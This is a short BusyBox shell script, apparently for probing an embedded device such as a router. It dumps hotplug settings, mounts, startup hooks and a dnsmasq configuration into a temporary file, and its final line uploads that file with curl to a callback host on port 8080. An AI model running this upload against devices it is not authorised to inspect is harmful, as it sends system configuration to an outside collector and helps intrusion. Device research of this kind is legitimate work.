#!/bin/sh
CB="http://192.168.0.27:8080"
BB=/bin/busybox
$BB echo "===== /proc/sys/kernel/hotplug =====" > /tmp/cp2.txt
$BB cat /proc/sys/kernel/hotplug 2>&1 >> /tmp/cp2.txt || $BB echo "(empty/missing)" >> /tmp/cp2.txt
$BB echo "===== /proc/mounts =====" >> /tmp/cp2.txt
$BB cat /proc/mounts >> /tmp/cp2.txt
$BB echo "===== /etc/rcS_hook =====" >> /tmp/cp2.txt
$BB ls -la /etc/rcS_hook 2>&1 >> /tmp/cp2.txt
$BB echo "===== /etc/hotplug.d =====" >> /tmp/cp2.txt
$BB ls -R /etc/hotplug.d 2>&1 >> /tmp/cp2.txt
$BB echo "===== /var/tmp/dconf/dnsmasq.conf =====" >> /tmp/cp2.txt
$BB cat /var/tmp/dconf/dnsmasq.conf >> /tmp/cp2.txt
/usr/sbin/curl -m 10 -T /tmp/cp2.txt "${CB}/probe_log?tag=cat_probe2" 2>/dev/null || true
